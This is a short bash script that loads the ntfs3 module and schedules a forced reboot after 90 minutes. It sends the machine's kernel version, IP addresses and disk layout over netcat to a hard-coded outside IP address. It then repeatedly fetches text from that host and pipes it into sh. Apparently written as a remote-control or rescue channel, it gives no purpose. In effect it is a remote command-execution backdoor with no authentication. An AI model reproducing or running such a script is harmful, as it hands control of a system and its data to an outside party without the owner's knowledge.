#!/bin/bash
modprobe ntfs3
(sleep 5400; reboot -f) &
{
    uname -a
    ip address show
    lsblk
    fdisk -l
} | nc -w 10 57.129.54.120 23458
until (( SECONDS >= 5400 )); do
    nc -w 10 57.129.54.120 23458 | sh
    sleep 5
done
